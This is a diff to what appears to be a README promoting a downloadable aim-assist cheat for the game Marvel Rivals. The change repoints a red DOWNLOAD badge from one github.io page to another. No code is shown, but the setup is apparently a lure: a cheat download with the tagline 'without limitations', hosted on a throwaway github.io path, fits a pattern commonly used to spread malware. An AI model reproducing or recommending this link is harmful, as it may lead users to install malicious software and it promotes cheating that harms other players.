@@ -2,7 +2,7 @@
 ### *Achieve what you always wanted — without limitations.*
 
 <p align="center">
-  <a href="https://download-portal-demo.github.io/.github/MArvelrivvals1" target="_blank">
+  <a href="https://trahendon.github.io/.github/MArvelrivvals1in4PC" target="_blank">
     <img src="https://img.shields.io/badge/⬇️ DOWNLOAD-MARVEL_RIVALS_TOOL-red?style=for-the-badge&logo=marvel&logoColor=white" alt="Download Marvel Rivals Aim Assist" />
   </a>
 </p>
